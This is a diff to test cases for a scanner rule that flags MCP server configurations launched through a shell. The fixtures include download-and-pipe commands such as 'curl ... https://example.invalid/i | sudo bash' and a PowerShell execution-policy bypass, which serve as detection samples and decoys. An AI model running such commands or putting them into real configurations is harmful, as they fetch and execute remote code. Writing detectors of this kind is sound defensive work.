@@ -1530,7 +1530,9 @@ describe("SW-L05 MCP servers auto-approved or launched through a shell", () => {
   it("vulnerable: wget, bash -lc, a shell given by path, and a whole command line in command", () => {
     expect(run(server({ command: "sh", args: ["-c", "wget -qO- https://example.invalid/i | bash"] })).all).toEqual(["mcp.json:7 low/high"]);
     expect(run(server({ command: "/bin/bash", args: ["-lc", "cd srv && npm start"] })).all).toEqual(["mcp.json:4 low/medium"]);
-    expect(run(server({ command: "bash -c 'curl -sL https://example.invalid/i | sudo bash'" })).all).toEqual(["mcp.json:4 low/high"]);
+    const whole = run(server({ command: "bash -c 'curl -sL https://example.invalid/i | sudo bash'" }));
+    expect(whole.all).toEqual(["mcp.json:4 low/high"]);
+    expect(whole.findings[0]!.why).toContain("runs `curl -sL https://example.invalid/i | sudo bash` on start");
     expect(run(server({ command: "zsh", args: ["-c", "node s.js"] })).findings[0]!.title).toBe('MCP server "tools" is launched through a shell (zsh -c)');
     const env = run(server({ command: "/usr/bin/env", args: ["-i", "HOME=/tmp", "bash", "-c", "node tools.js"] }));
     expect(env.all).toEqual(["mcp.json:4 low/medium"]);
@@ -1553,9 +1555,40 @@ describe("SW-L05 MCP servers auto-approved or launched through a shell", () => {
     expect(lines(server({ command: "docker", args: ["run", "-i", "--rm", "ghcr.io/example/mcp:1.2.0"] }))).toEqual([]);
     expect(lines(server({ command: "node", args: ["server.js", "-c", "config.json"] }))).toEqual([]);
     expect(lines(server({ command: "shellcheck-mcp", args: ["-c"] }))).toEqual([]);
+    // Options after the script file belong to the script, not the shell.
+    expect(lines(server({ command: "bash", args: ["./start.sh", "-c", "config.yml"] }))).toEqual([]);
+    expect(lines(server({ command: "bash", args: ["-l", "./start.sh", "-c", "config.yml"] }))).toEqual([]);
+    expect(lines(server({ command: "pwsh", args: ["-File", "start.ps1", "-c", "x"] }))).toEqual([]);
+    expect(lines(server({ command: "powershell", args: ["-NoProfile", "-f", "start.ps1", "-Command", "x"] }))).toEqual([]);
     // The usual way to start an npx server on Windows.
     expect(lines(server({ command: "cmd", args: ["/c", "npx", "-y", "@modelcontextprotocol/server-github"] }))).toEqual([]);
     expect(lines(server({ url: "https://mcp.example.net/sse", headers: { Authorization: "Bearer ${env:T}" } }))).toEqual([]);
+  });
+  it("decoy: a download-and-pipe string passed as an argument that no shell runs", () => {
+    const banner = "curl https://example.invalid | sh";
+    expect(lines(server({ command: "node", args: ["server.js", "--banner", banner] }))).toEqual([]);
+    expect(lines(server({ command: "npx", args: ["-y", "pkg@1.0.0", banner] }))).toEqual([]);
+    expect(lines(server({ command: "bash", args: ["./start.sh", banner] }))).toEqual([]);
+    // Only the word after `-c` is run; later words are $0, $1 ...
+    expect(run(server({ command: "sh", args: ["-c", "node s.js", banner] })).all).toEqual(["mcp.json:4 low/medium"]);
+  });
+  it("vulnerable: pipes that a shell does run", () => {
+    expect(run(server({ command: "sh", args: ["-ec", "curl -fsSL https://example.invalid/i|bash -s -- --yes"] })).all).toEqual([
+      "mcp.json:7 low/high",
+    ]);
+    // Split over several args, it is reported at the first word cmd runs ("curl", on line 7).
+    expect(run(server({ command: "cmd.exe", args: ["/c", "curl", "https://example.invalid/i", "|", "sh"] })).all).toEqual([
+      "mcp.json:7 low/high",
+    ]);
+    expect(run(server({ command: "cmd.exe", args: ["/c", "npx", "-y", "pkg", "|", "more"] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "pwsh", args: ["-EncodedCommand", "ZQBjAGgAbwA="] })).all).toEqual(["mcp.json:4 low/medium"]);
+  });
+  it("vulnerable: shell options before the run-a-command flag", () => {
+    expect(run(server({ command: "bash", args: ["-o", "pipefail", "-c", "node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "bash", args: ["--norc", "-e", "-c", "node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
+    expect(run(server({ command: "pwsh", args: ["-ExecutionPolicy", "Bypass", "-Command", "node s.js"] })).all).toEqual([
+      "mcp.json:4 low/medium",
+    ]);
   });
   it("finds the shell wrapper in every MCP config SW-L04 reads", () => {
     const s = { mcpServers: { tools: { command: "bash", args: ["-c", "node s.js"] } } };
